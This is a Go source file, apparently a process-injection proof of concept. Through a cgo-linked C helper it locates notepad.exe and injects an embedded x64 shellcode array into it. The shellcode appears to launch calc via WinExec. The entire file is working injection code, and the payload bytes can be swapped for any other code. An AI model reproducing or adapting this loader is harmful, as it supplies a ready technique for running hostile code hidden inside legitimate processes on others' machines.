package main

/*
#cgo LDFLAGS: -lpsapi
#include "ProcInjMapper.h"
*/
import "C"
import (
    "fmt"
    "unsafe"
)

func main() {
    shellcode := []byte{
        0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54,
        0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76,
        0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17,
        0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17,
        0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F,
        0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4,
        0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3,
    }

    procname := C.CString("notepad.exe")
    defer C.free(unsafe.Pointer(procname))

    pid := C.find_process(procname)
    if pid == 0 {
        fmt.Println("[!] Process not found")
        return
    }

    scess := C.inject_shellcode(pid, (*C.uchar)(&shellcode[0]), C.size_t(len(shellcode)))
    if scess == C.FALSE {
        fmt.Println("[!] Injection failed")
    } else {
        fmt.Println("[+] Injection successful")
    }
}
